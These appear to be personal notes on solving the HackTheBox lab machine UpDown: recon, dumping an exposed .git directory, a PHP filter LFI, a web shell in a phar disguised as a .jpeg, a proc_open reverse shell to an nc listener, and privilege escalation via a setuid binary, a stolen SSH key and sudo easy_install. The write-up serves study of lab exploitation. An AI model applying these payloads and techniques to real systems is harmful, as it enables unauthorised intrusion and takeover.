Visiting website 

![[Pasted image 20250419214223.png]]
- add `siteisup.htb` to `/etc/hosts`

Tried a cheeky `hi'` and got a hacking attempt was detected message.

![[Pasted image 20250419214529.png]]

Start burp?

Saved HTTP request to a file. 

Started #ffuf to fuzz the parameter using `special-chars.txt` wordlist

```
ffuf -request updown.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt
```

There doesn't seem to be a vulnerability 

![[Pasted image 20250419215429.png]]

Going to run #feroxbuster now 

```
feroxbuster -u http://siteisup.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Basically nothing. 

![[Pasted image 20250419220053.png]]

Randomly adding `index.php` to end of url and confirm site is in php.

![[Pasted image 20250419220754.png]]

I'm gonna try the gobuster from ippsec as well. 

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php -o gobuster.txt -u http://10.10.11.177
```

Enter in http://127.0.0[.]1 with debug mode on to see the actual request.

![[Pasted image 20250419221332.png]]
- Try to find other web severs ðŸ‘€

```
nmap -p- 10.10.11.177 -v -oN allports-nmap
```


Can run gobuster on the "dev" directory found previously also

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.dev -u http://10.10.11.177/dev
```

We discover a .git directory :)

![[Pasted image 20250419222211.png]]

Can also try to grab files

![[Pasted image 20250419221831.png]]

Got some juicies in the /dev/.git directory 

![[Pasted image 20250419222311.png]]

Found some juicy root info 

![[Pasted image 20250419222538.png]]
- `root:010dcc30cc1e89344e2bdbd3064f61c772d89a34` 
- root@siteisup

Can use the tool #git-dumper 

https://github.com/arthaud/git-dumper

```
./git_dumper.py http://siteisup.htb/dev/.git ../website 
```

Change into website directory and we have source code for website :)

![[Pasted image 20250419223607.png]]

Spotting LFI vulnerability in these include statements in the source code.

![[Pasted image 20250421195806.png]]

If page doesn't include bin, usr, home, var, etc then it will display the page with a .php extension. 

So /etc/passwd won't work. 

Check the git log. 

![[Pasted image 20250421212906.png]]
- interesting delete .htpassword commit

It was empty. 

There's a virtual host. Can use wfuzz or gobuster to try to get the name of the vhost. 

![[Pasted image 20250421213801.png]]

Try prepending `dev.siteisup.htb` to guess the vhost. with the added header of `Special-Dev: only4dev` in Burp repeater.

![[Pasted image 20250421214038.png]]

In Burpsuite, go to "Proxy" tab. Click on "Options" tab. 

Click add on "Match and Replace" tab. 

Specify these options

![[Pasted image 20250422195533.png]]

Now anything that goes through Burp will add this header. 

![[Pasted image 20250422195827.png]]

Now navigating to dev.siteisup.htb should bring up a new web page with the ability to upload files. 

![[Pasted image 20250422200411.png]]

Sending a burp request like 

```
GET /?page=php://filter/convert.base64-encode/resource=index
```

![[Pasted image 20250422200649.png]]

This returns a base64 string

![[Pasted image 20250422200724.png]]

Decode this base64 string using 

```
echo -n '<PASTE BASE64 STRING>' | base64 -d
```

This is just the source code that we already have. 


php is being appended in the source code 

![[Pasted image 20250423211717.png]]
which makes it tough because checker.php is filtering out a bunch of files we can't upload
![[Pasted image 20250423211838.png]]
getExtension function is going to get the very last thing after the last period
![[Pasted image 20250423212048.png]]

So we can only upload file extensions that won't get RCE.

Confirming this...

Create a file called `test.php` with

```
<?php
system($_GET['cmd']);
<KALI IP ADDRESS>
?
```

And this upload isn't allowed.

Try to rename this script and give it a .txt file extension and the code is just echoed to the web page. 

Set up nc listener with -k flag also so that web app can connect multiple times. 

```
sudo nc -lvnkp 80
```

![[Pasted image 20250422202454.png]]
![[Pasted image 20250423212719.png]]

#pharwrapper - which is like a zip file in php

We're going to give this php code a phar wrapper.

Name the file test.php again

```
zip test.phar test.php
```
- Inside of test.phar file is test.txt

Rename test.phar test.jpeg in case .phar is blacklisted

```
mv test.phar test.jpeg
```

Upload test.jpeg with the nc listener running to prevent the file from getting cleaned up

```
sudo nc -lvnkp 80
```


Test.jpeg upload

![[Pasted image 20250423214642.png]]

Here is test.jpeg when you click on it 

![[Pasted image 20250423214722.png]]

So we want to include this with our Burp request 

![[Pasted image 20250423214914.png]]
- got 500 internal server error - this means there may be an error in the php code

Simplifying test.php payload by removing the system command and replacing it with an echo command 

![[Pasted image 20250423215126.png]]

Rezip the new test.php file and upload it to the server.

Then copy new md5 sum into burp request

![[Pasted image 20250423215346.png]]
- only get 'PleaseSubscribe' and not the echo so we know we have code execution

Go back to test.php and run `phpinfo();`

![[Pasted image 20250423215523.png]]

Rezip, upload to web server, and send md5 hash with burp.

![[Pasted image 20250423215703.png]]
- php info page

Now can navigate to this page with the url 
![[Pasted image 20250423215753.png]]

Search for "disable_functions" on this php info page

![[Pasted image 20250423220545.png]]
- save this to a text file

We can see that the system function is disabled

![[Pasted image 20250423220635.png]]

We gotta figure out if there's any functions that are enabled that could give us code execution.

Looking at [dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) tool on github (it is python 2 tho :/  )

This shows us some dangerous functions 

![[Pasted image 20250423221047.png]]

We can create our own script thing to test this out.

Create file called `dangerous.php`

![[Pasted image 20250425211940.png]]

Test this out by cd'ing into website directory and running 

```
php dangerous.php
```

Result
![[Pasted image 20250425212021.png]]

Zip the `dangerous.php` function now 

```
zip test.jpeg dangerous.php
```

![[Pasted image 20250425212138.png]]

Upload test.jpeg. 

![[Pasted image 20250425212210.png]]

Navigate to uploads 

![[Pasted image 20250425212255.png]]

Get the md5 hash. 

Go to Burp repeater and paste md5 hash and request dangerous

![[Pasted image 20250425212414.png]]
- we see proc_open is enabled

Google "php proc_open"

Add php code to execute proc_open() within dangerous.php function

![[Pasted image 20250425212607.png]]

Replace cmd with a bash oneliner

![[Pasted image 20250425212705.png]]

Rename test.php to shell.php

Zip the shell.php file 

```
zip test.jpeg shell.php
```

Set up nc listener

```
nc -lvnp 9001
```

Upload test.jpeg to site 

Get the new md5 hash. 

Paste the new hash and request shell in Burp request.

![[Pasted image 20250425213041.png]]

Get shell on the box. 

![[Pasted image 20250425213114.png]]

Spawn interactive shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```
stty raw -echo; fg
```

```
export TERM=xterm
```

First, look for hardcoded credentials.

Look in 

`/var/www/html` - nothing

Look in `/home` and we have access to `/developer` directory

Discover `user.txt` but we don't have permissions to read

![[Pasted image 20250425213527.png]]

We can read dev directory

![[Pasted image 20250425213626.png]]

Run `file *` and see that one is an ELF binary and one is python script

![[Pasted image 20250425213730.png]]

Content of python script

![[Pasted image 20250425213812.png]]

If "input" is used, you can get code execution 

![[Pasted image 20250425213848.png]]

Let's execute siteisup binary which has a "setuid" which means when it executes, it executes as owner.

![[Pasted image 20250425214132.png]]

Now we are the developer user instead of www-data on the box.

Still can't read users.txt because my setuid was set to developer but not setgid...

We can go into .ssh and grab the private key. 

ssh into the box as developer user. 

![[Pasted image 20250425214415.png]]

Now we can read user.txt

Back to the original shell and run 

```
sudo -l
```

![[Pasted image 20250425214530.png]]

We can run easy_install with sudo. 

Go to GTFO bins and see if there's anything for easy_install with sudo.

There is! Just need to run this 

![[Pasted image 20250425214645.png]]

Got root 

![[Pasted image 20250425214707.png]]

Download this repo with git clone. 

Execute this to generate test.txt with a bunch of junk.

![[Pasted image 20250425215323.png]]

here's test.txt (truncated)

![[Pasted image 20250425215413.png]]

Paste this junk into Burp repeater to get the phpinfo page
